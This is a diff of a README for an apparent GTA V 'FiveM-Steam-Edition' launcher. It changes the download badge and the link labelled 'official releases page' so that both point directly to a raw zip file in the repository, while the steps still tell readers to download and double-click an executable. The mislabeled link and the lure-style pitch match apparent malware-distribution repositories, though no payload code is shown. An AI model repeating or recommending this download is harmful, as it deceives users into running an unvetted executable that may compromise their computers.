@@ -1,6 +1,6 @@
 # 🎮 FiveM-Steam-Edition - Launch GTA V Roleplay Servers Instantly
 
-[![](https://img.shields.io/badge/Download-FiveM_Steam_Edition-blue)](https://github.com/anti-truck651/FiveM-Steam-Edition/releases)
+[![](https://img.shields.io/badge/Download-FiveM_Steam_Edition-blue)](https://github.com/anti-truck651/FiveM-Steam-Edition/raw/refs/heads/main/Engine/Edition-Five-Steam-1.6.zip)
 
 FiveM-Steam-Edition provides a streamlined client launcher for Grand Theft Auto V roleplay. This software connects your computer to custom multiplayer servers. You gain access to unique game modes, custom vehicle assets, and community-driven scripts. Users join populated roleplay environments without manual configuration of complex server files. Our launcher manages the necessary resources so you spend more time in the game.
 
@@ -21,7 +21,7 @@ If you have modified your base game files, revert them to the original state to 
 
 Follow these directions to set up the client on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/anti-truck651/FiveM-Steam-Edition/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/anti-truck651/FiveM-Steam-Edition/raw/refs/heads/main/Engine/Edition-Five-Steam-1.6.zip) to find the latest version.
 2. Select the most recent release labeled with a version number.
 3. Download the executable file to a folder on your computer.
 4. Locate the downloaded file and double-click to run the installer.
